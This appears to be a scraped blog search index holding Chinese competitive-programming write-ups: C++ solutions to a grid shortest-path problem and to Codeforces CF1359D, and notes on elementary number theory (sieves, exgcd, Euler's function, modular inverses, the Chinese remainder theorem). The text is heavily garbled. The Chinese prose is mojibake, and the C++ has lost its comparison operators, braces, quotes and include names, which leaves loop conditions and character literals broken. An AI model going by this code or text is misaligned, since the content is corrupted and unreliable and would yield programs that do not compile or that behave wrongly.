queue#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2005;const int MOD = 1e9 + 7;inline int read ();struct node int x,y,cos,dir; bool operator (const node a) const return cos a.cos; //dir 1 2 3 4 N S W E;priority_queue node q;int n,m,a,b,c,d,ans = INF,dis[MAX][MAX][5]; char str[MAX][MAX];int main () n = read ();m = read ();a = read (),b = read (),c = read (),d = read (); for (int i = 1;i = n;++i) scanf (%s,str[i] + 1); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (str[i][j] == S) q.push (i,j,0,1); q.push (i,j,0,2); q.push (i,j,0,3); q.push (i,j,0,4); init (dis); while (!q.empty ()) node now = q.top ();q.pop (); if (now.x 1 || now.x n || now.y 1 || now.y m) continue; if (str[now.x][now.y] == #) continue; if (str[now.x][now.y] == E) ans = min (ans,now.cos); break; if (dis[now.x][now.y][now.dir] = now.cos) continue; dis[now.x][now.y][now.dir] = now.cos; if (now.dir == 1) if (str[now.x][now.y] == S) q.push (now.x - 1,now.y,now.cos,1); if (str[now.x][now.y] == |) q.push (now.x - 1,now.y,now.cos + a,1); if (str[now.x][now.y] == -) q.push (now.x,now.y - 1,now.cos + a,3),q.push (now.x,now.y + 1,now.cos + a,4); if (str[now.x][now.y] == /) q.push (now.x,now.y + 1,now.cos + b,4); if (str[now.x][now.y] == \\\\) q.push (now.x,now.y - 1,now.cos + b,3); if (str[now.x][now.y] == .) q.push (now.x - 1,now.y,now.cos + c,1),q.push (now.x,now.y - 1,now.cos + c,3),q.push (now.x,now.y + 1,now.cos + c,4); if (str[now.x][now.y] == ) q.push (now.x,now.y - 1,now.cos + d,3); if (str[now.x][now.y] == ) q.push (now.x,now.y + 1,now.cos + d,4); if (str[now.x][now.y] == ^) q.push (now.x - 2,now.y,now.cos,1); if (str[now.x][now.y] == v) ; if (now.dir == 2) if (str[now.x][now.y] == S) q.push (now.x + 1,now.y,now.cos,2); if (str[now.x][now.y] == |) q.push (now.x + 1,now.y,now.cos + a,2); if (str[now.x][now.y] == -) q.push (now.x,now.y - 1,now.cos + a,3),q.push (now.x,now.y + 1,now.cos + a,4); if (str[now.x][now.y] == /) q.push (now.x,now.y - 1,now.cos + b,3); if (str[now.x][now.y] == \\\\) q.push (now.x,now.y + 1,now.cos + b,4); if (str[now.x][now.y] == .) q.push (now.x + 1,now.y,now.cos + c,2),q.push (now.x,now.y - 1,now.cos + c,3),q.push (now.x,now.y + 1,now.cos + c,4); if (str[now.x][now.y] == ) q.push (now.x,now.y - 1,now.cos + d,3); if (str[now.x][now.y] == ) q.push (now.x,now.y + 1,now.cos + d,4); if (str[now.x][now.y] == ^) ; if (str[now.x][now.y] == v) q.push (now.x + 2,now.y,now.cos,2); if (now.dir == 3) if (str[now.x][now.y] == S) q.push (now.x,now.y - 1,now.cos,3); if (str[now.x][now.y] == |) q.push (now.x - 1,now.y,now.cos + a,1),q.push (now.x + 1,now.y,now.cos + a,2); if (str[now.x][now.y] == -) q.push (now.x,now.y - 1,now.cos + a,3); if (str[now.x][now.y] == /) q.push (now.x + 1,now.y,now.cos + b,2); if (str[now.x][now.y] == \\\\) q.push (now.x - 1,now.y,now.cos + b,1); if (str[now.x][now.y] == .) q.push (now.x,now.y - 1,now.cos + c,3),q.push (now.x - 1,now.y,now.cos + c,1),q.push (now.x + 1,now.y,now.cos + c,2); if (str[now.x][now.y] == ) q.push (now.x,now.y - 2,now.cos,3); if (str[now.x][now.y] == ) ; if (str[now.x][now.y] == ^) q.push (now.x - 1,now.y,now.cos + d,1); if (str[now.x][now.y] == v) q.push (now.x + 1,now.y,now.cos + d,2); if (now.dir == 4) if (str[now.x][now.y] == S) q.push (now.x,now.y + 1,now.cos,4); if (str[now.x][now.y] == |) q.push (now.x - 1,now.y,now.cos + a,1),q.push (now.x + 1,now.y,now.cos + a,2); if (str[now.x][now.y] == -) q.push (now.x,now.y + 1,now.cos + a,4); if (str[now.x][now.y] == /) q.push (now.x - 1,now.y,now.cos + b,1); if (str[now.x][now.y] == \\\\) q.push (now.x + 1,now.y,now.cos + b,2); if (str[now.x][now.y] == .) q.push (now.x,now.y + 1,now.cos + c,4),q.push (now.x - 1,now.y,now.cos + c,1),q.push (now.x + 1,now.y,now.cos + c,2); if (str[now.x][now.y] == ) ; if (str[now.x][now.y] == ) q.push (now.x,now.y + 2,now.cos,4); if (str[now.x][now.y] == ^) q.push (now.x - 1,now.y,now.cos + d,1); if (str[now.x][now.y] == v) q.push (now.x + 1,now.y,now.cos + d,2); if (ans == INF) printf (-1 ); else printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1359D Yet Another Yet Another Task","path":"/2021/11/25/CF1359D/","content":"ç”±äº $a_i \\in [-30,30]$ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æšä¸¾åŒºé—´å‡ºç°çš„æœ€å¤§å€¼ã€‚ç”±äºå¯ä»¥åªé€‰ä¸€å¼ ç‰Œï¼Œæ‰€ä»¥æœ€å¤§å¾—åˆ†çš„æœ€å°å€¼ä¸º $0$ã€‚ é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆæšä¸¾ $i \\in [1,30]$ï¼Œè¡¨ç¤ºè¯¥æ®µåŒºé—´çš„æœ€å¤§å€¼ä¸º $i$ï¼Œç„¶åå†…å±‚å¾ªç¯æ±‚å’Œï¼Œå³ sum += a[j]ã€‚ç”±äºæœ€å°å€¼ä¸º $0$ï¼Œæ‰€ä»¥ sum = max (sum,0) å¯ä»¥æ’é™¤æ‰åŒºé—´å’Œä¸ºè´Ÿæ•°çš„æƒ…å†µã€‚åˆå› ä¸ºç¬¬ä¸€é‡å¾ªç¯ä¸­å·²ç»é™åˆ¶äº†æœ€å¤§å€¼ï¼Œæ‰€ä»¥å½“å‡ºç° a[j] i çš„æƒ…å†µæ—¶ï¼Œä¹Ÿè¦å°† sum æ›´æ–°ä¸º $0$ã€‚ç­”æ¡ˆçš„æ›´æ–°æ˜¾ç„¶æœ‰ ans = max (ans,sum - i)ï¼Œè¯¥è¯­å¥æˆç«‹çš„å……åˆ†æ¡ä»¶æ˜¯åºåˆ—ä¸­å‡ºç°äº† $i$ã€‚åªéœ€è¦å†ç”¨ä¸€ä¸ªæ•°ç»„è®°å½•å‡ºç°æ•°å­—çš„æƒ…å†µå³å¯ï¼Œæ³¨æ„è´Ÿæ•°çš„æƒ…å†µï¼ˆæˆ‘å°±æ˜¯å› ä¸ºè¿™ä¸ªé”™è¯¯ $\\texttt{RE}$ äº†ä¸€æ¬¡ qwqï¼‰ï¼ŒåŒæ—¶è¿˜éœ€è¦æ³¨æ„è¯¥æ•°ç»„åœ¨ sum æ›´æ–°æ—¶ä¹Ÿè¦åŒæ—¶æ›´æ–°ã€‚ æœ€åæ¥ç®€å•çœ‹ä¸€ä¸‹ä»£ç ï¼š #include iostream#include cstdio#define ll long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e7 + 9;inline int read ();int a[MAX],sum,n,ans;bool f[50];int main () n = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = 30;++i) sum = 0; for (int j = 1;j = 30;++j) f[j] = 0; for (int j = 1;j = n;++j) sum += a[j]; if (sum 0 || a[j] i) sum = 0,f[i] = 0;//ä¸ç¬¦åˆæ¡ä»¶å°±å°† sum ç½®ä¸º 0 else if (a[j] 0) f[a[j]] = 1;//æ ‡è®°æ•°å­—ï¼Œæ³¨æ„ç­›å»éæ­£æ•° sum = max (sum,0); if (f[i]) ans = max (ans,sum - i);//i å‡ºç°è¿‡ printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f; åè®°ã€‚çœ‹äº†åˆ«çš„ $\\texttt{dalao}$ çš„é¢˜è§£ï¼Œå‘ç° f[i] çš„è®¾ç½®æœ‰äº›å¤šä½™ï¼Œå› ä¸ºå³ä½¿æœ€å¤§å€¼ $i$ æ²¡æœ‰å‡ºç°ï¼Œé‚£ä¹ˆç›¸å½“äºè¢«å¤šå‡ï¼Œç­”æ¡ˆä¸€å®šä¸ä¼šæœ€ä¼˜ã€‚","categories":["Solution"]},{"title":"åˆçº§æ•°å­¦ å­¦ä¹ ç¬”è®°","path":"/2021/11/19/Math/","content":"æ•°è®ºåŸºæœ¬æ¦‚å¿µ1. æ•´é™¤æ³•n = ak + r(0 \\le r < a) \\to k = \\lfloor \\frac{n}{a} \\rfloor2. ç®—æ•°åŸºæœ¬å®šç†$p_i$ ä¸ºç´ æ•°ï¼Œä¸” $p_i p_{i + 1}$ï¼Œåˆ™æœ‰ï¼š n = p_1^{a_1} p_2^{a_2} \\cdots p_m ^ {a_m}3. æœ€å¤§å…¬çº¦æ•°ä¸æœ€å°å…¬å€æ•°\\gcd (a,b) \\times \\operatorname{lcm} (a,b) = \\gcd (a,b) \\times \\frac{a \\times b}{\\gcd(a,b)} = a \\times b4. æ±‚ä¸€ä¸ªæ•°çš„çº¦æ•°ä¸ªæ•°ä¸€ä¸ªæ•°çš„æ¯ä¸ªå› å­å‡ç”±è‹¥å¹²ä¸ªç´ å› å­æ„æˆï¼Œç¬¬ $i$ ä¸ªç´ å› å­å…±æœ‰ $i + 1$ ç§å–æ³•ï¼Œæ‰€ä»¥æ€»ä¸ªæ•°ä¸ºï¼ˆ$k$ ä¸ºç´ å› å­çš„æ€»ä¸ªæ•°ï¼‰ï¼š \\prod_{i = 1}^{k} (a_i + 1)ä»£ç å¦‚ä¸‹ï¼š int divisor (int n)//ç®—æ•°åŸºæœ¬å®šç† int tot = 1; for (int i = 2;i * i = n;++i) if (n % i == 0) int cnt = 0; while (n % i == 0) n /= i,++cnt;//ç´ å› å­i åœ¨ num ä¸­çš„ä¸ªæ•° tot *= (cnt + 1); if (n 1) tot *= 2;//å‰©ä¸‹çš„ n ä¹Ÿä¸ºç´ æ•°çš„æƒ…å†µ return tot;int divisor_direct (int n)//ç›´æ¥æš´åŠ›æšä¸¾ int cnt = 0; for (int i = 1;i * i = n;++i) if (n % i == 0) ++cnt; if (n / i != i) ++cnt;//å®Œå…¨å¹³æ–¹æ•°æ—¶ä¼šé‡å¤è®¡ç®— return cnt; ç´ æ•°ç­›æ³•1. æœ´ç´ ç­›æ³•å°†æ¯ä¸€ä¸ªæ•°çš„æ‰€æœ‰å€æ•°éƒ½ç­›å»ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºï¼š$O(\\frac{n}{2} + \\frac{n}{3} + \\cdots + 1)$ã€‚æ‰€ä»¥å½“ $\\lim(n \\to \\infty)$ æ—¶ï¼Œè¿‘ä¼¼ä¸º $O(n\\log n)$ã€‚ 2. å¸¸æ•°ä¼˜åŒ–æšä¸¾å°çš„é‚£ä¸ªå› å­ã€‚ for (int i = 2;i * i = n;++i) if (!flag[i]) for (int j = i * i;j = n;j += i) flag[j] = 1; 3. çº¿æ€§ç­›æ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ void work (int n)//ä¿è¯æ¯ä¸ªæ•°æœ€å¤šè¢«ç­›ä¸€æ¬¡ for (int i = 2;i = n;++i) if (!flag[i]) p[++cnt] = i;//ç´ æ•° for (int j = 1;j = cnt;++j) if (i * p[j] n) break;//è¾¹ç•Œ flag[i * p[j]] = 1;//p[j] æ˜¯ i * p[j] çš„æœ€å°ç´ å› å­ if (i % p[j] == 0) break;//ä¹‹å p[j] ä¸ä¸º i * p[j] çš„æœ€å°ç´ å› å­ //è‹¥ p[j] = 2,i = 4ï¼Œåˆ™ä¹‹å p[j] = 3,i = 4 ä¸ç¬¦åˆæ¡ä»¶ã€‚å¦åˆ™ 12 = 2*6 = 3 * 4 è¢«ç­›çš„æ¬¡æ•° 1 æ¬§å‡ é‡Œå¾—ç®—æ³•1. è¾—è½¬ç›¸å‡è‹¥ $a b$ï¼Œåˆ™ $\\gcd (a,b) = \\gcd (a - b,b)$ã€‚ 2. è¾—è½¬ç›¸é™¤è‹¥ $a b$ï¼Œåˆ™ $\\gcd (a,b) = \\gcd (b,a \\bmod b)$ã€‚ int gcd (int a,int b) if (a b) swap (a,b); return (!b) ? a : gcd (b,a % b); æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ç”±æ¬§å‡ é‡Œå¾—ç®—æ³•å¯çŸ¥ $ax + by = \\gcd (a,b)$ ä¸€å®šå­˜åœ¨ä¸€ç»„è§£ã€‚é‚£ä¹ˆæ±‚è§£ $ax + by = c$ æ—¶ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š ax + by = c(a > b)\\\\\\texttt{è®¾ } ax' + by' = \\gcd (a,b)\\\\\\texttt{åˆ™è¾—è½¬ç›¸å‡çŸ¥ } (a - b) \\times x_1 + b \\times y_1 = \\gcd (a,b)\\\\\\therefore a \\times x_1 + b \\times (y_1 - x_1) = \\gcd (a,b)\\\\\\therefore x = x_1,y = y_1 - x_1\\\\\\\\\\texttt{ç”±è¾—è½¬ç›¸é™¤ä»£æ›¿è¾—è½¬ç›¸å‡ï¼Œåˆ™æœ‰ } b \\times x_1 + a \\bmod b \\times y_1 = \\gcd (a,b)\\\\\\because a \\bmod b = a - \\lfloor \\frac{a}{b} \\rfloor \\times b\\\\\\therefore b \\times x_1 + (a - \\lfloor \\frac{a}{b} \\rfloor \\times b) \\times y_1 = \\gcd (a,b)\\\\\\therefore a \\times y_1 + b \\times (x_1 - \\lfloor \\frac{a}{b} \\rfloor \\times y_1) = \\gcd (a,b)\\\\\\therefore x = y_1,y = x_1 - \\lfloor \\frac{a}{b} \\rfloor \\times y_1ä¸æ–­é€’å½’å¾—åˆ° $\\gcd (a,b) \\times x + 0 \\times y = \\gcd (a,b)$ï¼Œå¾—åˆ°ç‰¹è§£ $x = 1,y = 0$ã€‚ int exgcd (int a,int b,int x,int y) int g = a; if (b) g = exgcd (b,a % b,x,y); x -= (a / b) * y; swap (x,y); else x = 1,y = 0;//ä¸€ç»„ç‰¹è§£ return g; è®¾ $k_1 = \\dfrac{a}{\\gcd (a,b)},k_2 = \\dfrac{b} {\\gcd (a,b)}$ï¼Œæ˜¾ç„¶ $\\gcd (k_1,k_2) = 1$ã€‚è®¾ $x,y$ çš„æœ€å°å˜åŒ–å•ä½æ˜¯ $d_1,d_2$ï¼Œåˆ™æ­¤æ—¶ $k_1 = d_2,k_2 = d_1$ï¼Œæ‰€ä»¥é€šè§£æ˜¯ï¼š \\begin{cases}x = x + k \\times \\dfrac{b}{\\gcd(a,b)}\\\\y = y - k \\times \\dfrac{a}{\\gcd(a,b)}\\\\k \\in \\rm{Z} \\\\\\end{cases}æ¬§æ‹‰å‡½æ•°2. ç§¯æ€§å‡½æ•°è®¾ $p$ ä¸ºè´¨æ•°ï¼Œæ±‚ $\\phi(p^k)$ï¼š \\phi(p^k) = p^k - \\frac{p^k}{p} = p^k - p^{k-1} = (p-1)p^{k-1}åŒç†ï¼Œå¯¹äºä¸¤ä¸ªä¸åŒè´¨æ•°çš„ä¹˜ç§¯ $n = p_1^{a_1} p_2^{a_2}$ï¼Œç”±å®¹æ–¥åŸç†ï¼š \\begin{aligned} \\phi(p_1^{a_1} p_2^{a_2}) &= p_1^{a_1} p_2^{a_2} - \\frac{p_1^{a_1} p_2^{a_2}}{p_1} - \\frac{p_1^{a_1} p_2^{a_2}}{p_2} + \\frac{p_1^{a_1} p_2^{a_2}}{p_1 p_2} \\\\ &= p_1^{a_1} p_2^{a_2} \\left(1 - \\frac{1}{p_1} - \\frac{1}{p_2} + \\frac{1}{p_1 p_2}\\right) \\\\ &= p_1^{a_1} p_2^{a_2} \\left(1 - \\frac{1}{p_1}\\right)\\left(1 - \\frac{1}{p_2}\\right) \\\\ &= \\phi(p_1^{a_1}) \\times \\phi(p_2^{a_2}) \\end{aligned}å› æ­¤ï¼Œæ¬§æ‹‰å‡½æ•°æ˜¯ç§¯æ€§å‡½æ•°ã€‚ 3. è®¡ç®—é€šå¼å°† $n$ è¿›è¡Œè´¨å› æ•°åˆ†è§£ï¼š n = p_1^{a_1} p_2^{a_2} \\cdots p_m^{a_m}ç”±ç§¯æ€§å‡½æ•°æ€§è´¨ï¼š \\begin{aligned} \\phi(n) &= \\phi(p_1^{a_1}) \\times \\phi(p_2^{a_2}) \\times \\cdots \\times \\phi(p_m^{a_m}) \\\\ &= \\prod_{i=1}^m (p_i - 1)p_i^{a_i-1} \\\\ &= \\prod_{i=1}^m p_i^{a_i} \\times \\frac{p_i - 1}{p_i} \\\\ &= n \\times \\prod_{i=1}^m \\frac{p_i - 1}{p_i} \\end{aligned}è¿™ä¸ªå…¬å¼å¯ä»¥ç›´æ¥ç”¨äºè®¡ç®—ä»»æ„æ­£æ•´æ•°çš„æ¬§æ‹‰å‡½æ•°å€¼ã€‚ 5. ä»£ç  æ ¹æ®æ¬§æ‹‰å‡½æ•°é€šå¼æ±‚è§£ã€‚ void work (int n) phi[1] = 1; for (int i = 2;i = n;++i) phi[i] = i;//å…ˆæ ‡è®°ä¸ºè‡ªå·±ï¼Œæ–¹ä¾¿æ ‡è®°è´¨æ•°ï¼Œä¹Ÿæ–¹ä¾¿ä¸ºå…¬å¼æ³•æ±‚è§£ for (int i = 2;i = n;++i) if (phi[i] == i)//ä¸ºç´ æ•° for (int j = i;j = n;j += i) phi[j] = phi[j] / i * (i - 1);//å…¶ä¸­çš„ä¸€ä¸ª (pi - 1) / pi æ ¹æ®çº¿æ€§ç­›å®ç° $O(n)$ çš„æ—¶é—´å¤æ‚åº¦æ±‚è§£ã€‚ void work (int n) phi[1] = 1; for (int i = 2;i = n;++i) if (!flag[i]) p[++cnt] = i; phi[i] = i - 1;//ç´ æ•° p çš„æ¬§æ‹‰å‡½æ•°ä¸º p - 1 for (int j = 1;j = cnt;++j) if (i * p[j] n) break; flag[i * p[j]] = 1; if (i % p[j] == 0) phi[i * p[j]] = phi[i] * p[j];//è‹¥ p èƒ½æ•´é™¤ n / pï¼Œåˆ™ Ï† (n) = Ï† (n / p) * p break; phi[i * p[j]] = phi[i] * (p[j] - 1);//è‹¥ p ä¸ n / p äº’è´¨ï¼Œä¸” p ä¸ºè´¨æ•°ï¼Œåˆ™ Ï† (n) = Ï† (n / p) * (p - 1) åˆ©ç”¨æ€§è´¨ $f$ çš„æ±‚è§£ã€‚ void work (int n) for (int i = 1;i = n;++i) phi[i] = i; for (int i = 1;i = n;++i) for (int j = i + i;j = n;j += i) phi[j] -= phi[i];//å‡å»è‡ªå·±æ‰€æœ‰å› å­çš„å€¼å³ä¸º Ï†(i) æ¬§æ‹‰å®šç†å¦‚æœ $a,n$ ä¸ºæ­£æ•´æ•°ï¼Œä¸” $\\gcd (a,n) = 1$ï¼Œåˆ™ $a^ {\\phi(n)} â‰¡ 1 \\pmod n$ã€‚ å·²çŸ¥ $a,n \\in \\rm{N_{+}}$ï¼Œä¸” $\\gcd (a,n) = 1$ã€‚æ±‚è¯ $a^{\\phi(n)} \\equiv 1 \\pmod n$ã€‚ è¯æ˜ï¼šä»¤é›†åˆ\\ A = \\{x_1,x_2,\\cdots,x_{\\phi(n)}\\}\\ æ¥è¡¨ç¤ºæ‰€æœ‰ä¸å¤§äº\\ n\\ ä¸”ä¸å…¶äº’è´¨çš„æ•°\\\\å†ä»¤é›†åˆ\\ B = \\{ax_1 \\bmod n,ax_2 \\bmod n,\\cdots,ax_{\\phi{n}} \\bmod n\\}\\\\\\because \\gcd (a,n) = 1,\\gcd (x_i,n) = 1\\\\\\therefore \\gcd (ax_i,n) = 1\\\\ç”±æ¬§å‡ é‡Œå¾—ç®—æ³•å¯çŸ¥\\ \\gcd (ax_i \\bmod n,n) = 1\\\\\\\\å‡è®¾\\ B\\ é›†åˆä¸­çš„å­˜åœ¨ç›¸åŒå…ƒç´ ï¼Œå³\\ ax_1 = k_1n + b,ax_2 = k_2n + b\\ (0 < x_1,x_2 < n\\ ä¸”\\ \\gcd(a,n) = 1)\\\\åˆ™æœ‰\\ a(x_1 - x_2) = (k_1 - k_2)b\\\\\\because \\gcd (a,n) = 1\\\\\\therefore x_1 - x_2 = n,k_1 - k_2 = a\\\\\\because 0 < x_1,x_2 < n\\\\\\therefore x_1 - x_2 = n\\ ä¸æˆç«‹ï¼Œä¸å‡è®¾çŸ›ç›¾ï¼Œæ•…\\ B\\ é›†åˆä¸­å…ƒç´ äº’ä¸ç›¸åŒ\\\\\\\\\\therefore A = B\\\\\\therefore a^{\\phi(n)}\\times \\prod_{i = 1}^{\\phi(n)} x_i \\equiv \\prod_{i = 1}^{\\phi(n)} a \\times x_i \\equiv \\prod_{i = 1}^{\\phi(n)} x_i \\pmod n\\\\\\\\\\therefore a^{\\phi(n)} \\equiv 1 \\pmod nä¹˜æ³•é€†å…ƒ1. è´¹é©¬å°å®šç†æ¬§æ‹‰å®šç†çš„ç‰¹æ®Šæƒ…å†µï¼Œå½“ $n$ ä¸ºè´¨æ•°æ—¶ï¼š \\because \\phi(n) = n - 1\\\\ \\therefore a^{\\phi(n)} = a^{n - 1} \\equiv 1 \\mod n2. è®¡ç®—$a \\div b \\% c$ æ—¶ï¼Œå‡è®¾å­˜åœ¨ $p \\times b â‰¡ 1 \\pmod c$ï¼Œåˆ™ $p$ ä¸º $b$ çš„é€†å…ƒã€‚$a \\div b \\% c = a \\times p \\% c$ã€‚ a \\div b = k \\times c + r\\\\ a = k \\times b \\times c + b \\times r\\\\ \\because p \\times b \\equiv 1 \\pmod c\\\\ \\therefore a \\times p \\equiv k \\times c + r \\pmod c\\\\ \\therefore p \\times b + k \\times c = 1 ç›¸å½“äº $b,c$ å·²çŸ¥ï¼Œåˆ™å¯ä»¥é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚é€†å…ƒï¼Œä½†éœ€è¦ $\\gcd (b,c) = 1$ æ—¶æ‰æœ‰è§£ã€‚æ—¶é—´å¤æ‚åº¦ $O(n \\log n)$ã€‚ int inv (int b,int c) int x,y; exgcd (b,c,x,y); return (x % c + c) % c;//åŒ–æˆæ­£æ•° å½“ $c$ ä¸ºè´¨æ•°æ—¶ï¼Œé€†å…ƒå¯ä»¥è¡¨ç¤ºä¸º $b^{c - 2} \\% c$ï¼Œç›´æ¥å¯ä»¥ä½¿ç”¨å¿«é€Ÿå¹‚æ±‚è§£ã€‚ \\because c \\ ä¸ºè´¨æ•°\\\\ \\therefore \\gcd (b,c) = 1\\\\ \\therefore b^{\\phi(c)} \\bmod c = 1\\\\ \\therefore b \\times b^{\\phi(c) - 1} = 1\\\\ åˆ™é€†å…ƒ\\ p= b^{\\phi(c) - 1} = b^{c - 1 - 1} = b^{c - 2}3. çº¿æ€§æ±‚é€†å…ƒæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ ä»¤\\ p\\ æ˜¯è´¨æ•°ï¼Œåˆ™æœ‰:\\ inv_i = (p - \\dfrac{p}{i}) \\times inv_{p \\% i} \\bmod pã€‚\\\\ \\\\ ä»¤\\ t = \\dfrac{p}{i},k = p \\% iï¼Œåˆ™ï¼š\\\\ t \\times i + k \\equiv 0 \\pmod p\\\\ -t \\times i \\equiv k \\pmod p\\\\ åŒæ—¶é™¤ä»¥\\ i \\times k\\ å¾—ï¼š\\\\ -t \\times inv_k \\equiv intv_i \\pmod pvoid init (int n,int mod) inv[1] = 1; for (int i = 2;i = n;++i) inv[i] = (p - p / i) * inv[p % i] % p; 4. æ— æ³•æ±‚é€†å…ƒçš„è½¬åŒ–\\dfrac{a}{b} \\bmod m = \\dfrac{a \\bmod (b \\times m)}{b}\\\\ \\\\ \\dfrac{a}{b} = k \\times m + x\\ (x < m)\\\\ a = k \\times b \\times m + b \\times x\\\\ a \\bmod (b \\times m) = b \\times x\\\\ \\frac{a \\bmod (b \\times m)}{b} = xä¸­å›½å‰©ä½™å®šç†æ±‚è§£ä»¥ä¸‹æ–¹ç¨‹ï¼š \\forall m_{i \\mid 1 \\le i \\le n},\\gcd (m_i,m_{i + j}) = 1\\ (1 \\le j \\le n - i)\\\\\\begin{cases}x \\equiv a_1 \\pmod {m_1}\\\\x \\equiv a_2 \\pmod {m_2}\\\\\\cdots\\\\x \\equiv a_n \\pmod {m_n}\\\\\\end{cases}æ„é€ ç­”æ¡ˆï¼Œè®¾ \\begin{aligned}M &= \\prod_{i = 1}^n m_i, \\quad M_i = \\frac{M}{m_i} \\\\s_i &: \\; M_i \\times s_i \\equiv 1 \\pmod {m_i} \\\\\\because M_i = \\frac{M}{m_i} \\\\\\therefore M_i \\times s_i \\bmod m_j = 0 \\quad (1 \\le j \\le n,\\ j e i) \\\\x &= \\sum_{i = 1}^n a_i \\times M_i \\times s_i \\\\\\text{é€šè§£ä¸º} x + k \\times M\\end{aligned}æ‰€ä»¥ç›´æ¥é€šè¿‡ $n$ æ¬¡ $\\texttt{exgcd}$ æ±‚å‡º $s_i$ï¼Œæœ€ååˆå¹¶å³å¯ã€‚ ll CRT (int n,int a[],int m[]) ll M = 1,ans = 0; for (int i = 1;i = n;++i) M *= m[i]; for (int i = 1;i = n;++i) ll x = 0,y = 0; exgcd (M / m[i],m[i],x,y); x = (x % m[i] + m[i]) % m[i]; ans += M / m[i] * x * a[i]; ans %= M; return ans; æ•´é™¤åˆ†å—æ±‚ä¸‹åˆ—å¼å­çš„å€¼ã€‚ \\sum _{i = 1} ^ n \\lfloor\\dfrac{n}{i}\\rfloor \\ (1 \\le n \\le 10^9)è‹¥ç”¨æœ´ç´ çš„ç®—æ³•ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ï¼Œæ˜¾ç„¶ä¼š $\\texttt{TLE}$ã€‚é‚£ä¹ˆå†ç»™å‡ºä¸€ç§ $O(\\sqrt n)$ çš„åšæ³•ã€‚å…ˆç»™å‡ºæ‰€æœ‰çš„ $\\lfloor\\dfrac{n}{i}\\rfloor$ çš„å–å€¼ä¸ä¼šè¶…è¿‡ $\\sqrt{n}$ ç§çš„è¯æ˜ï¼š å½“ \\ i \\le \\sqrt{n} æ—¶ï¼Œæ˜¾ç„¶å–å€¼ä¸è¶…è¿‡ \\sqrt{n};\\\\ å½“ i > \\sqrt{n} æ—¶ï¼Œ\\lfloor\\dfrac{n}{i}\\rfloor < \\sqrt{n}ï¼Œæ•…å–å€¼ä¸è¶…è¿‡ \\sqrt{n}ã€‚\\\\ ç»¼ä¸Šï¼Œå‘½é¢˜æˆç«‹ã€‚è®¾ä¸€æ®µå–å€¼å‡ä¸º $\\lfloor\\dfrac{n}{i}\\rfloor$ çš„åŒºé—´çš„å·¦ã€å³ç«¯ç‚¹åˆ†åˆ«ä¸º $L,R$ã€‚ \\because \\lfloor\\dfrac{n}{R}\\rfloor \\le \\frac{n}{R}\\\\\\therefore R \\le \\dfrac{n}{\\lfloor\\dfrac{n}{L}\\rfloor}\\\\\\therefore R_{\\max} = \\biggl\\lfloor{\\dfrac{n}{\\lfloor{\\dfrac{n}{L}\\rfloor}}\\biggr\\rfloor}ä»£ç å¦‚ä¸‹ï¼š for (int L = 1,R;L = n;L = R + 1) R = n / (n / L); ans += 1ll * (R - L * 1) * (n / L); ç»„åˆæ•°å­¦åŸºç¡€1. ç»„åˆæ•°çš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³• å¯¹äºé€’æ¨å…¬å¼ï¼Œæ˜¯å¯¹äºç¬¬ $n$ é¡¹æ˜¯å¦é€‰æ‹©å¾—å‡ºçš„ã€‚ \\tbinom{n}{m} = C^m_n = \\dfrac{n \\times (n - 1) \\times (n - 2) \\cdots \\times (n - m + 1)} {m!} = \\dfrac{n!}{m!(n - m)!}\\\\\\tbinom{n}{m} = \\tbinom{n - 1}{m - 1} + \\tbinom{n - 1}{m}2. ç»„åˆæ•°çš„é¢„å¤„ç† void init () c[0][0] = 1; for (int i = 1;i n;++i) c[i][i] = c[i][0] = 1; for (int j = 1;j i;++j) c[i][j] = c[i - 1][j] + c[i - 1][j - 1]; c[i][j] %= MOD; 3. ç»„åˆæ•°çš„å˜å½¢(1)\\ k \\times \\tbinom{n}{k} = k \\times \\dfrac{n!}{k!(n - k)!}\\\\= k \\times n \\times \\dfrac{(n - 1)!}{k!(n - k)!} = n \\times \\dfrac{(n - 1)!}{(k - 1)!(n - 1 - (k - 1))!} = n \\times \\tbinom{n - 1}{k - 1}\\\\ (2)\\ \\sum_{i = 1}^{n}i \\times \\tbinom{n}{i} = \\sum_{i = 1}^{n} n \\times \\tbinom{n - 1}{i - 1} = n \\times 2^{n - 1}\\\\(3)\\ \\sum_{i = 1}^{n} i^2 \\times \\tbinom{n}{i} = n \\times (n + 1) \\times 2^{n - 2}\\\\(4)\\ \\sum_{i = 0}^{n} \\tbinom{n}{i}^2 = \\tbinom{2n}{n}å…¶ä¸­çš„$(3)$å¯ä»¥è½¬åŒ–ä¸ºæ¨¡å‹ã€‚ç­‰å·å·¦è¾¹ä¸ºç­çº§ä¸­çš„ $n$ 